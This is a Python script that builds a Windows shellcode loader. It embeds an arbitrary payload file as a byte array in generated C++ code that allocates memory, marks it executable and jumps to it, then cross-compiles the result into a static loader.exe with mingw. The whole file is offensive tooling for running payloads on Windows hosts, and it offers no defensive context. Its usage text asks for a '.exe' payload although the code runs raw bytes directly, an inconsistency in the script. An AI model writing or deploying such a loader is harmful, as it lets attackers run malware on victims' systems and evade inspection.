import os
import sys
import subprocess

def build_loader(payload_path):
    with open(payload_path, 'rb') as f:
        data = f.read()

    hex_payload = ", ".join(f"0x{b:02x}" for b in data)

    cpp_code = f"""
#include <windows.h>

unsigned char payload[] = {{{hex_payload}}};

int main() {{
    LPVOID mem = VirtualAlloc(NULL, sizeof(payload), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    memcpy(mem, payload, sizeof(payload));
    DWORD oldProtect;
    VirtualProtect(mem, sizeof(payload), PAGE_EXECUTE_READ, &oldProtect);
    ((void(*)())mem)();
    return 0;
}}
"""

    with open("loader.cpp", "w") as f:
        f.write(cpp_code)

    cmd = ["x86_64-w64-mingw32-g++", "loader.cpp", "-o", "loader.exe", "-static"]
    subprocess.run(cmd, check=True)

if __name__ == "__main__":
    if len(sys.argv) < 2:
        print("Usage: python3 loader.py <payload.exe>")
    else:
        build_loader(sys.argv[1])
